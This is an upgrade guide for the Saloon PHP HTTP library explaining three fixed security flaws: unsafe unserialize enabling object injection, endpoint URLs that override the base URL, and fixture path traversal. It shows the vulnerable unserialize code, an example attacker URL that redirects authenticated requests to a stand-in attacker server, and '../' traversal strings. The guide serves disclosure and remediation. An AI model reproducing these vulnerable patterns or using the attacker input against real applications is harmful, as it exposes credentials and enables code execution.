# ⚠️ Upgrading from v3 to v4

Saloon version four initially released as a security update without any new features. We highly recommend all users to upgrade to this version as this has been released to resolve **three breaking CVE issues** published on the **25th March 2026**.

### CVE Issues Resolved

* [Insecure deserialisation in AccessTokenAuthenticator (object injection / RCE)](https://github.com/saloonphp/saloon/security/advisories/GHSA-rf88-776r-rcq9)
* [Absolute URL in endpoint overrides base URL (SSRF / credential leakage)](https://github.com/saloonphp/saloon/security/advisories/GHSA-c83f-3xp6-hfcp)
* [Fixture name path traversal (out-of-bounds file read/write)](https://github.com/saloonphp/saloon/security/advisories/GHSA-f7xc-5852-fj99)

More information on the issues resolved is explained below.

### Upgrade Guide

To upgrade to Saloon v4 change the following dependencies in your `composer.json` file to `^4.0`&#x20;

<pre class="language-json"><code class="lang-json">{
    ...
<strong>    "saloonphp/saloon": "^4.0",
</strong><strong>    "saloonphp/laravel-plugin": "^4.0"
</strong>    ....
}
</code></pre>

{% hint style="info" %}
You may not have installed the `saloonphp/laravel-plugin` if you are not using Laravel, additionally the plugins like the `saloonphp/cache-plugin` have been updated to support both v3 and v4.
{% endhint %}

After that, make sure to run the following command to update your `composer.lock` file and your `vendor` directory.

```bash
composer update "saloonphp/*"
```

{% hint style="info" %}
The above command will just update the `saloonphp` libraries in your application. If you have other dependencies using Saloon you should make sure that they are updated as well.&#x20;
{% endhint %}

### What's changed in v4?

There have been three breaking changes in Saloon v4, depending on your application's usage of Saloon, you may or may not encounter any issues.

#### <mark style="color:$danger;">High</mark> - Removal of the serialize/unserialize methods in the AccessTokenAuthenticator class

With previous versions of Saloon, when using the built in OAuth2 `AuthorizationCodeGrant` trait and the `AccessTokenAuthenticator` class, this had the ability for the class to be serialized and unserialized. This was offered as a convenient way of storing the authenticator's data in your database, or somewhere in your application to be kept at rest and resolved at a later time.

Internally this used `allowed_classes ⇒ true` which under specific circumstances, an attacker can abuse this feature potentially escalating it to a remote code execution (RCE) attack.

<pre class="language-php"><code class="lang-php">&#x3C;?php

class AccessTokenAuthenticator implements OAuthAuthenticator
{
    public function __construct(
        public readonly string $accessToken,
        public readonly ?string $refreshToken = null,
        public readonly ?DateTimeImmutable $expiresAt = null,
    ) {
        //
    }

    ...

    public function serialize(): string
    {
        return serialize($this);
    }

    public static function unserialize(string $string): static
    {
<strong>        return unserialize($string, ['allowed_classes' => true]);
</strong>    }
}
</code></pre>

With Saloon v4, we have removed the `serialize`  and `unserialize`  methods, and if you were previously relying on this feature we recommend reading the `accessToken`, `refreshToken`  and `expiresAt`  properties directly and storing them.

Additionally if you used the following casts in the Laravel plugin, these have also been removed in v4 and we recommend building your own implementation.

* OAuthAuthenticatorCast
* EncryptedOAuthAuthenticatorCast

#### <mark style="color:$warning;">Medium</mark> - New opt-in requirement to change base URL on a request

With previous versions of Saloon, a lesser-known feature was that if you wanted to, you could provide a fully qualified URL in the request class' `resolveEndpoint` method and Saloon would use this URL instead of base URL of the connector.

<pre class="language-php"><code class="lang-php">&#x3C;?php

<strong>class GetServersRequest extends Request
</strong>{
    protected Method $method = Method::GET;

    public function resolveEndpoint(): string
    {
<strong>        return 'https://forge.laravel.com/api/servers';
</strong>    }
}
</code></pre>

If your application sets this endpoint from **user generated content** this could potentially lead to an attack where a malicious actor could change the endpoint to a URL of a server they maintain. For example, let's say you have a Instagram connector which looks up profiles based on the profile's handle (for example @saloon)

```php
// Connector

class InstagramConnector extends Connector
{
    public function resolveBaseUrl(): string
    {
        return 'https://instagram.com';
    }
}

// Request

class GetProfileRequest extends Request
{
    public function resolveEndpoint(): string
    {
        return $this->handle;
    }
}
```

During normal operations, this might look like this

```php
$form = [
   'handle' => '@saloon',
];

new InstagramConnector()->send(new GetProfileRequest($form['handle']))
```

However an attacker could do something like this

```php
$form = [
   'handle' => 'https://some-attacker-server.tld/attack',
];

new InstagramConnector()->send(new GetProfileRequest($form['handle']))
```

Then Saloon would send all of the authentication, headers and other potentially sensitive information to the attacker's URL.

We **highly recommend** that your application sanitizes all user input and prevents this from happening, but as an additional precautionary measure this default behaviour has now been disabled  and is now an opt-in on both requests and OAuth2 configuration scenarios.

<pre class="language-php"><code class="lang-php">class GetProfileRequest extends Request
{
<strong>    public ?bool $allowBaseUrlOverride = true;
</strong>
    public function resolveEndpoint(): string
    {
        return $this->handle;
    }
}
</code></pre>

<pre class="language-php"><code class="lang-php">class SpotifyConnector extends Connector
{
    use AuthorizationCodeGrant;

    public function resolveBaseUrl(): string
    {
        // Spotify's API has a different base URL for OAuth2 auth.

        return 'https://api.spotify.com/v1';
    }

    protected function defaultOauthConfig(): OAuthConfig
    {
        return OAuthConfig::make()
            ->setClientId('my-client-id')
            ->setClientSecret('my-client-secret')
            ->setDefaultScopes(['user-read-currently-playing'])
            ->setRedirectUri('https://my-app.saloon.dev/auth/callback')
            ->setAuthorizeEndpoint('https://accounts.spotify.com/authorize')
            ->setTokenEndpoint('https://accounts.spotify.com/api/token')
<strong>            ->setAllowBaseUrlOverride()
</strong>            ->setUserEndpoint('/me')
            ->setRequestModifier(function (Request $request) {
                // Optional: Modify the requests being sent.
            });
    }
}
</code></pre>

#### <mark style="color:blue;">Low</mark> - Restriction of path traversal in test fixtures

With previous versions of Saloon, when using the request recording functionality (fixtures) in tests you were able to define a path where the fixtures were stored.

<pre class="language-php"><code class="lang-php">&#x3C;?php

test('can store servers in the database from laravel forge', function () {
    MockClient::global([
<strong>        GetServersRequest::class => MockResponse::fixture('custom-path/servers'),
</strong>    ]);
});
</code></pre>

Previously, Saloon didn't restrict the use of path traversal techniques such as `../`  and `~` . With Saloon v4, this has now been restricted. You now cannot do the following

```php
MockResponse::fixture('../../custom-path/servers'); ⛔️
MockResponse::fixture('~/custom-path/servers'); ⛔️
```
